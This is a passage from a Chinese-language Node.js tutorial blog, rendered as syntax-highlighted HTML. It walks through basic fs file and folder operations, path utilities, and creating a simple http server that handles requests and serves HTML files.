class="hljs-comment">//异步写入，非阻塞式，创建线程去执行写操作</span>fs<span class="hljs-selector-class">.writeFileSync</span>()  <span class="hljs-comment">//同步写入，阻塞式，等待主程序执行完再执行后续代码</span>fs<span class="hljs-selector-class">.appendFileSync</span>()fs<span class="hljs-selector-class">.writeFile</span>(,&#123;flag: <span class="hljs-string">&quot;a&quot;</span>&#125;)fs<span class="hljs-selector-class">.createWriteStream</span>()<span class="hljs-selector-class">.write</span>()fs<span class="hljs-selector-class">.readFile</span>()   <span class="hljs-comment">//异步读取</span>fs<span class="hljs-selector-class">.readfileSync</span>()  <span class="hljs-comment">//同步读取</span>fs<span class="hljs-selector-class">.createReadSteam</span>()   <span class="hljs-comment">//流读取</span>fs<span class="hljs-selector-class">.unlink</span>()fs<span class="hljs-selector-class">.rm</span>()fs<span class="hljs-selector-class">.rename</span>()fs<span class="hljs-selector-class">.renameSync</span>()fs<span class="hljs-selector-class">.stat</span>()</code></pre></div><h4 id="文件写"><a href="#文件写" class="headerlink" title="文件写"></a>文件写</h4><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">//1.导入fs模块</span><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<span class="hljs-comment">//2.写入文件</span>fs.<span class="hljs-title function_">writeFile</span>(<span class="hljs-string">&#x27;./note.txt&#x27;</span>,<span class="hljs-string">&#x27;contentaaaaa&#x27;</span>, <span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> &#123;    <span class="hljs-comment">// 写入失败：err是一个错误对象   写入成功：err是null</span>    <span class="hljs-keyword">if</span>(err)&#123;        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;写入失败&#x27;</span>);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;写入成功&#x27;</span>);&#125;)</code></pre></div><h4 id="追加写入"><a href="#追加写入" class="headerlink" title="追加写入"></a>追加写入</h4><div class="code-wrapper"><pre><code class="hljs arcade">const fs = require(<span class="hljs-string">&#x27;fs&#x27;</span>);fs.appendFile(<span class="hljs-string">&quot;./note.txt&quot;</span>,<span class="hljs-string">&quot;contentbbbbb&quot;</span>, err =&gt; &#123;    <span class="hljs-comment">//判断</span>    <span class="hljs-keyword">if</span>(err)&#123;        <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;写入失败&quot;</span>);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;追加成功&quot;</span>)&#125;)fs.appendFileSync(<span class="hljs-string">&quot;./note.txt&quot;</span>,<span class="hljs-string">&quot;\r\ncontentccccc&quot;</span>);fs.writeFile(<span class="hljs-string">&quot;./note.txt&quot;</span>,<span class="hljs-string">&quot;waaaaaaaaa&quot;</span>,&#123;<span class="hljs-attr">flag</span>: <span class="hljs-string">&quot;a&quot;</span>&#125; , err =&gt; &#123;    <span class="hljs-comment">//判断</span>    <span class="hljs-keyword">if</span>(err)&#123;        <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;写入失败&quot;</span>);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;追加成功&quot;</span>)&#125;)</code></pre></div><h4 id="流写入"><a href="#流写入" class="headerlink" title="流写入"></a>流写入</h4><div class="code-wrapper"><pre><code class="hljs swift"><span class="hljs-comment">// 1.导入fs模块</span>const fs <span class="hljs-operator">=</span> require(&#x27;fs&#x27;);<span class="hljs-comment">//2.创建写入流对象</span>const ws <span class="hljs-operator">=</span> fs.createWriteStream(<span class="hljs-string">&quot;./num.txt&quot;</span>);<span class="hljs-comment">//3. write</span>ws.write(<span class="hljs-string">&quot;111<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>&quot;</span>);ws.write(<span class="hljs-string">&quot;222<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>&quot;</span>);ws.write(<span class="hljs-string">&quot;333<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>&quot;</span>);ws.write(<span class="hljs-string">&quot;444<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>&quot;</span>);ws.end();</code></pre></div><h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;./package.json&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> &#123;    <span class="hljs-keyword">if</span> (err) &#123;        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data)&#125;)</code></pre></div><div class="code-wrapper"><pre><code class="hljs lasso"><span class="hljs-keyword">let</span> <span class="hljs-built_in">data</span> = fs.readFileSync(<span class="hljs-string">&#x27;./package.json&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>);console.<span class="hljs-keyword">log</span>(<span class="hljs-built_in">data</span>);</code></pre></div><h4 id="流读取"><a href="#流读取" class="headerlink" title="流读取"></a>流读取</h4><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<span class="hljs-keyword">const</span> rs = fs.<span class="hljs-title function_">createReadStream</span>(<span class="hljs-string">&quot;./package.json&quot;</span>,<span class="hljs-string">&quot;utf8&quot;</span>);<span class="hljs-comment">//给流绑定事件</span>rs.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-function"><span class="hljs-params">chunk</span> =&gt;</span> &#123;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(chunk.<span class="hljs-property">length</span>);    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(chunk.<span class="hljs-title function_">toString</span>());&#125;);<span class="hljs-comment">//给流绑定事件</span>rs.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;读取完成&#x27;</span>);&#125;)</code></pre></div><h4 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h4><div class="code-wrapper"><pre><code class="hljs coffeescript">const fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);const readStream = fs.createReadStream(<span class="hljs-string">&#x27;./package.json&#x27;</span>,<span class="hljs-string">&#x27;utf8&#x27;</span>);const writeStream = fs.createWriteStream(<span class="hljs-string">&#x27;./package2.json&#x27;</span>,<span class="hljs-string">&#x27;utf8&#x27;</span>);readStream.<span class="hljs-literal">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function"><span class="hljs-params">(chunk)</span> =&gt;</span> &#123;    writeStream.write(chunk);&#125;);readStream.<span class="hljs-literal">on</span>(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;    writeStream.end();&#125;)//readStream.pipe(writeStream);</code></pre></div><h4 id="文件移动与重命名"><a href="#文件移动与重命名" class="headerlink" title="文件移动与重命名"></a>文件移动与重命名</h4><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);fs.<span class="hljs-title function_">rename</span>(<span class="hljs-string">&#x27;./package2.json&#x27;</span>,<span class="hljs-string">&#x27;/Users/pacemrc/tmp/package2.json&#x27;</span>,<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> &#123;    <span class="hljs-keyword">if</span>(err)&#123;        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;文件移动成功&quot;</span>)&#125;)</code></pre></div><h4 id="文件删除1"><a href="#文件删除1" class="headerlink" title="文件删除1"></a>文件删除1</h4><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);fs.<span class="hljs-title function_">unlink</span>(<span class="hljs-string">&#x27;/Users/pacemrc/tmp/new_name.json&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;    <span class="hljs-keyword">if</span>(err)&#123;        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;文件删除成功&quot;</span>)&#125;);</code></pre></div><h4 id="文件删除2"><a href="#文件删除2" class="headerlink" title="文件删除2"></a>文件删除2</h4><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);fs.<span class="hljs-title function_">rm</span>(<span class="hljs-string">&#x27;/Users/pacemrc/tmp/new_name.json&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;    <span class="hljs-keyword">if</span>(err)&#123;        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;文件删除成功&quot;</span>)&#125;);</code></pre></div><h4 id="查看文件属性"><a href="#查看文件属性" class="headerlink" title="查看文件属性"></a>查看文件属性</h4><div class="code-wrapper"><pre><code class="hljs lasso">const fs = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);fs.stat(<span class="hljs-string">&#x27;./package.json&#x27;</span>, (err, <span class="hljs-built_in">data</span>) =&gt; &#123;    <span class="hljs-keyword">if</span> (err)&#123;        console.<span class="hljs-keyword">log</span>(err);        <span class="hljs-keyword">return</span>;    &#125;    console.<span class="hljs-keyword">log</span>(<span class="hljs-built_in">data</span>);    console.<span class="hljs-keyword">log</span>(<span class="hljs-built_in">data</span>.isFile());    <span class="hljs-comment">//是否为文件</span>    console.<span class="hljs-keyword">log</span>(<span class="hljs-built_in">data</span>.isDirectory());   <span class="hljs-comment">//是否为目录</span>&#125;)</code></pre></div><h3 id="文件夹操作"><a href="#文件夹操作" class="headerlink" title="文件夹操作"></a>文件夹操作</h3><h4 id="相关函数-1"><a href="#相关函数-1" class="headerlink" title="##相关函数"></a>##相关函数</h4><div class="code-wrapper"><pre><code class="hljs dos"><span class="hljs-built_in">fs</span>.<span class="hljs-built_in">mkdir</span>()<span class="hljs-built_in">fs</span>.readdir()<span class="hljs-built_in">fs</span>.<span class="hljs-built_in">rmdir</span>()</code></pre></div><h4 id="创建文件夹"><a href="#创建文件夹" class="headerlink" title="创建文件夹"></a>创建文件夹</h4><div class="code-wrapper"><pre><code class="hljs stata"><span class="hljs-keyword">const</span> fs = require(&#x27;fs&#x27;);fs.<span class="hljs-keyword">mkdir</span>(&#x27;/Users/pacemrc/tmp/testdir&#x27;,<span class="hljs-keyword">err</span> =&gt; &#123;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">err</span>)&#123;        console.<span class="hljs-keyword">error</span>(<span class="hljs-keyword">err</span>);        <span class="hljs-keyword">return</span>;    &#125;    console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;创建文件夹成功&quot;</span>)&#125;)<span class="hljs-comment">//递归创建文件夹</span>fs.<span class="hljs-keyword">mkdir</span>(&#x27;/Users/pacemrc/tmp/testdir/a/b/c&#x27;,&#123;recursive: true&#125;,<span class="hljs-keyword">err</span> =&gt; &#123;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">err</span>)&#123;        console.<span class="hljs-keyword">error</span>(<span class="hljs-keyword">err</span>);        <span class="hljs-keyword">return</span>;    &#125;    console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;创建文件夹成功&quot;</span>)&#125;)</code></pre></div><h4 id="读取文件夹"><a href="#读取文件夹" class="headerlink" title="读取文件夹"></a>读取文件夹</h4><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);fs.<span class="hljs-title function_">readdir</span>(<span class="hljs-string">&#x27;/Users/pacemrc/tmp/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> &#123;    <span class="hljs-keyword">if</span>(err)&#123;        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data)&#125;)<span class="hljs-comment">// files</span>fs.<span class="hljs-title function_">readdir</span>(<span class="hljs-string">&#x27;/Users/pacemrc/tmp/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, files</span>) =&gt;</span> &#123;    <span class="hljs-keyword">if</span>(err)&#123;        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(files.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">file</span>) =&gt;</span> &#123;        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(file)    &#125;))&#125;)</code></pre></div><h4 id="删除文件夹"><a href="#删除文件夹" class="headerlink" title="删除文件夹"></a>删除文件夹</h4><div class="code-wrapper"><pre><code class="hljs stata">fs.<span class="hljs-keyword">rmdir</span>(&#x27;/Users/pacemrc/tmp/testdir&#x27;,<span class="hljs-keyword">err</span> =&gt; &#123;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">err</span>)&#123;        console.<span class="hljs-keyword">error</span>(<span class="hljs-keyword">err</span>);        <span class="hljs-keyword">return</span>;    &#125;    console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;删除文件夹成功&quot;</span>)&#125;)<span class="hljs-comment">// 递归删除  使用rm</span>fs.<span class="hljs-keyword">rm</span>(&#x27;/Users/pacemrc/tmp/testdir/a&#x27;,&#123;recursive: true&#125;,<span class="hljs-keyword">err</span> =&gt; &#123;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">err</span>)&#123;        console.<span class="hljs-keyword">error</span>(<span class="hljs-keyword">err</span>);        <span class="hljs-keyword">return</span>;    &#125;    console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;删除文件夹成功&quot;</span>)&#125;)</code></pre></div><h4 id="批量文件重命名"><a href="#批量文件重命名" class="headerlink" title="批量文件重命名"></a>批量文件重命名</h4><div class="code-wrapper"><pre><code class="hljs stata"><span class="hljs-keyword">const</span> fs = require(&#x27;fs&#x27;);<span class="hljs-comment">//  /Users/pacemrc/tmp/</span>fs.readdir(&#x27;/Users/pacemrc/tmp/testdir&#x27;, (<span class="hljs-keyword">err</span>, files) =&gt; &#123;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">err</span>)&#123;        console.<span class="hljs-keyword">error</span>(<span class="hljs-keyword">err</span>);        <span class="hljs-keyword">return</span>;    &#125;    files.<span class="hljs-keyword">forEach</span>(<span class="hljs-keyword">file</span> =&gt; &#123;        fs.<span class="hljs-keyword">rename</span>(&#x27;/Users/pacemrc/tmp/testdir/&#x27;+<span class="hljs-keyword">file</span>, &#x27;/Users/pacemrc/tmp/testdir/0&#x27;+<span class="hljs-keyword">file</span>,(<span class="hljs-keyword">err</span>) =&gt; &#123;            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">err</span>)&#123;                console.<span class="hljs-keyword">error</span>(<span class="hljs-keyword">err</span>);                <span class="hljs-keyword">return</span>;            &#125;            console.<span class="hljs-built_in">log</span>(<span class="hljs-keyword">file</span> + <span class="hljs-string">&quot;重命名成功&quot;</span>)        &#125;)    &#125;)&#125;)</code></pre></div><h2 id="path模块"><a href="#path模块" class="headerlink" title="path模块"></a>path模块</h2><div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-selector-tag">path</span><span class="hljs-selector-class">.resolve</span>()  <span class="hljs-comment">//拼接规范的绝对路径</span><span class="hljs-selector-tag">path</span><span class="hljs-selector-class">.sep</span>()   <span class="hljs-comment">//获取操作系统的路径分隔符</span><span class="hljs-selector-tag">path</span><span class="hljs-selector-class">.parse</span>()   <span class="hljs-comment">//解析路径并返回对象</span><span class="hljs-selector-tag">path</span><span class="hljs-selector-class">.basename</span>()   <span class="hljs-comment">//获取路径的基础名称</span><span class="hljs-selector-tag">path</span><span class="hljs-selector-class">.dirname</span>()   <span class="hljs-comment">//获取路径的目录名</span><span class="hljs-selector-tag">path</span><span class="hljs-selector-class">.extname</span>()   <span class="hljs-comment">//获取路径的扩展名</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs lua">const <span class="hljs-built_in">path</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);let path1 = <span class="hljs-built_in">path</span>.resolve(__dirname, <span class="hljs-string">&#x27;index.html&#x27;</span>);let path2 =  <span class="hljs-string">&#x27;/Users/pacemrc/tmp/testdir/01.txt&#x27;</span>;console.<span class="hljs-built_in">log</span>(path1);console.<span class="hljs-built_in">log</span>(<span class="hljs-built_in">path</span>.sep);console.<span class="hljs-built_in">log</span>(<span class="hljs-built_in">path</span>.parse(path2));console.<span class="hljs-built_in">log</span>(<span class="hljs-built_in">path</span>.basename(path2));console.<span class="hljs-built_in">log</span>(<span class="hljs-built_in">path</span>.dirname(path2));console.<span class="hljs-built_in">log</span>(<span class="hljs-built_in">path</span>.extname(path2));</code></pre></div><h2 id="http模块"><a href="#http模块" class="headerlink" title="http模块"></a>http模块</h2><h3 id="创建http服务"><a href="#创建http服务" class="headerlink" title="创建http服务"></a>创建http服务</h3><div class="code-wrapper"><pre><code class="hljs livescript"><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<span class="hljs-keyword">const</span> server  = http.createServer(<span class="hljs-keyword">async</span> (req, res) =&gt; &#123;    res.setHeader(<span class="hljs-string">&#x27;content-type&#x27;</span>,<span class="hljs-string">&#x27;text/html;charset=utf-8&#x27;</span>);    res.end(<span class="hljs-string">&#x27;Hello World!中文测试&#x27;</span>);&#125;);server.listen(<span class="hljs-number">3000</span>,<span class="hljs-string">&quot;127.0.0.1&quot;</span>,() =&gt; &#123;    console.log(<span class="hljs-string">&quot;Server started on port 3000&quot;</span>);&#125;);</code></pre></div><h4 id="中文乱码解决"><a href="#中文乱码解决" class="headerlink" title="中文乱码解决"></a>中文乱码解决</h4><div class="code-wrapper"><pre><code class="hljs ada">response.setHeader(<span class="hljs-symbol">&#x27;Content</span>-<span class="hljs-keyword">Type</span><span class="hljs-string">&#x27;,&#x27;</span>text/html;charset=utf-<span class="hljs-number">8</span>&#x27;);</code></pre></div><p>获取请求头</p><div class="code-wrapper"><pre><code class="hljs oxygene">urlhttpVersion<span class="hljs-keyword">method</span><span class="hljs-title function_">statusMessage</span><span class="hljs-title function_">headers</span><span class="hljs-title function_">complete</span><span class="hljs-title function_">headersDistinct</span><span class="hljs-title function_">httpVersionMinor</span><span class="hljs-title function_">rawHeaders</span></code></pre></div><h3 id="获取请求体"><a href="#获取请求体" class="headerlink" title="获取请求体"></a>获取请求体</h3><div class="code-wrapper"><pre><code class="hljs coffeescript">const http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);const server  = http.createServer(<span class="hljs-keyword">async</span> (req, res) =&gt; &#123;    res.setHeader(<span class="hljs-string">&#x27;content-type&#x27;</span>,<span class="hljs-string">&#x27;text/html;charset=utf-8&#x27;</span>);    res.end(<span class="hljs-string">&#x27;Hello World!中文测试&#x27;</span>);        let body = <span class="hljs-string">&#x27;&#x27;</span>;        req.<span class="hljs-literal">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function"><span class="hljs-params">(chunk)</span> =&gt;</span> &#123;        body += chunk;    &#125;);        req.<span class="hljs-literal">on</span>(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;        console.log(body);    &#125;);&#125;);server.listen(<span class="hljs-number">3000</span>,<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;    console.log(<span class="hljs-string">&quot;Server started on port 3000&quot;</span>);&#125;);</code></pre></div><h3 id="获取请求url和查询参数"><a href="#获取请求url和查询参数" class="headerlink" title="获取请求url和查询参数"></a>获取请求url和查询参数</h3><div class="code-wrapper"><pre><code class="hljs qml"><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<span class="hljs-keyword">const</span> <span class="hljs-built_in">url</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;url&#x27;</span>);<span class="hljs-keyword">const</span> server  = http.createServer(<span class="hljs-keyword">async</span> (req, res) =&gt; &#123;    res.setHeader(<span class="hljs-string">&#x27;content-type&#x27;</span>,<span class="hljs-string">&#x27;text/html;charset=utf-8&#x27;</span>);    res.end(<span class="hljs-string">&#x27;Hello World!中文测试&#x27;</span>);    <span class="hljs-keyword">let</span> request = <span class="hljs-built_in">url</span>.parse(req.url,<span class="hljs-literal">true</span>);    <span class="hljs-keyword">let</span> pathname = request.pathname;    <span class="hljs-keyword">let</span> keyword = request.query.keyword;    <span class="hljs-built_in">console</span>.log(pathname);    <span class="hljs-built_in">console</span>.log(keyword);&#125;);server.listen(<span class="hljs-number">3000</span>,<span class="hljs-string">&quot;10.72.176.141&quot;</span>,() =&gt; &#123;    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Server started on port 3000&quot;</span>);&#125;);</code></pre></div><h3 id="获取请求url和查询参数22"><a href="#获取请求url和查询参数22" class="headerlink" title="获取请求url和查询参数22"></a>获取请求url和查询参数22</h3><div class="code-wrapper"><pre><code class="hljs qml"><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<span class="hljs-keyword">const</span> server  = http.createServer(<span class="hljs-keyword">async</span> (req, res) =&gt; &#123;    res.setHeader(<span class="hljs-string">&#x27;content-type&#x27;</span>,<span class="hljs-string">&#x27;text/html;charset=utf-8&#x27;</span>);    res.end(<span class="hljs-string">&#x27;Hello World!中文测试&#x27;</span>);    <span class="hljs-keyword">let</span> <span class="hljs-built_in">url</span> = <span class="hljs-keyword">new</span> URL(req.url,<span class="hljs-string">&quot;http://10.72.176.141:3000&quot;</span>);    <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">url</span>.search);    <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">url</span>.pathname);    <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">url</span>.searchParams.get(<span class="hljs-string">&#x27;keyword&#x27;</span>));    &#125;);server.listen(<span class="hljs-number">3000</span>,<span class="hljs-string">&quot;10.72.176.141&quot;</span>,() =&gt; &#123;    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Server started on port 3000&quot;</span>);&#125;);</code></pre></div><h3 id="Http请求练习"><a href="#Http请求练习" class="headerlink" title="Http请求练习"></a>Http请求练习</h3><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240628102048523.png"> </p><div class="code-wrapper"><pre><code class="hljs pgsql">const http = require(<span class="hljs-string">&#x27;http&#x27;</span>);const <span class="hljs-keyword">server</span> = http.createServer((req, res) =&gt; &#123;    res.setHeader(<span class="hljs-string">&#x27;content-type&#x27;</span>,<span class="hljs-string">&#x27;text/html;charset=utf-8&#x27;</span>);    let url = <span class="hljs-built_in">new</span> URL(req.url, &quot;http://10.72.176.141:3000&quot;);    let pathname = url.pathname;    <span class="hljs-keyword">if</span> (req.<span class="hljs-keyword">method</span> === <span class="hljs-string">&#x27;GET&#x27;</span> &amp;&amp; pathname === <span class="hljs-string">&#x27;/login&#x27;</span>) &#123;        res.<span class="hljs-keyword">end</span>(<span class="hljs-string">&#x27;登录页面&#x27;</span>);    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (req.<span class="hljs-keyword">method</span> === <span class="hljs-string">&#x27;GET&#x27;</span> &amp;&amp; pathname === <span class="hljs-string">&#x27;/reg&#x27;</span>) &#123;        res.<span class="hljs-keyword">end</span>(<span class="hljs-string">&#x27;注册页面&#x27;</span>);    &#125; <span class="hljs-keyword">else</span> &#123;        res.<span class="hljs-keyword">end</span>(<span class="hljs-string">&#x27;NOT FOUND&#x27;</span>);    &#125;&#125;);<span class="hljs-keyword">server</span>.<span class="hljs-keyword">listen</span>(<span class="hljs-number">3001</span>,&quot;10.72.176.141&quot;,()=&gt; &#123;    console.log(&quot;Server running on port: &quot; + <span class="hljs-keyword">server</span>.address().port);&#125;);</code></pre></div><h3 id="设置Http响应报文"><a href="#设置Http响应报文" class="headerlink" title="设置Http响应报文"></a>设置Http响应报文</h3><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<span class="hljs-keyword">const</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;content-type&#x27;</span>,<span class="hljs-string">&#x27;text/html;charset=utf-8&#x27;</span>);    res.<span class="hljs-property">statusCode</span> = <span class="hljs-number">404</span>;    res.<span class="hljs-property">statusCode</span> = <span class="hljs-number">302</span>;    res.<span class="hljs-property">statusMessage</span> = <span class="hljs-string">&quot;I&#x27;m pacemrc&quot;</span>;    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;custom-header&#x27;</span>,<span class="hljs-string">&#x27;pacemrc&#x27;</span>);    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Sever&#x27;</span>,<span class="hljs-string">&#x27;ndoejs&#x27;</span>);    <span class="hljs-comment">// 设置同名响应头</span>    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;test&#x27;</span>,[<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>]);    <span class="hljs-comment">// 设置响应体</span>    res.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;this is body&quot;</span>);    res.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;this is body&quot;</span>);    res.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;this is body&quot;</span>);    res.<span class="hljs-title function_">end</span>();&#125;);server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>,<span class="hljs-string">&quot;10.72.176.141&quot;</span>,<span class="hljs-function">()=&gt;</span> &#123;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Server running on port: &quot;</span> + server.<span class="hljs-title function_">address</span>().<span class="hljs-property">port</span>);&#125;);</code></pre></div><p>res.write()方法可以写入Html文档，</p><p>响应html文件—通过读取文件方式将内容写入响应页面</p><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<span class="hljs-keyword">const</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;content-type&#x27;</span>,<span class="hljs-string">&#x27;text/html;charset=utf-8&#x27;</span>);    <span class="hljs-keyword">let</span> data = fs.<span class="hljs-title function_">readFileSync</span>(__dirname + <span class="hljs-string">&#x27;/table.html&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>);    res.<span class="hljs-title function_">write</span>(data.<span class="hljs-title function_">toString</span>());    res.<span class="hljs-title function_">end</span>();&#125;);server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>,<span class="hljs-string">&quot;10.72.176.141&quot;</span>,<span class="hljs-function">()=&gt;</span> &#123;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Server running on port: &quot;</span> + server.<span class="hljs-title function_">address</span>().<span class="hljs-property">port</span>);&#125;);</code></pre></div><h3 id="配置静态资源服务"><a href="#配置静态资源服务" class="headerlink" title="配置静态资源服务"></a>配置静态资源服务</h3><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<span 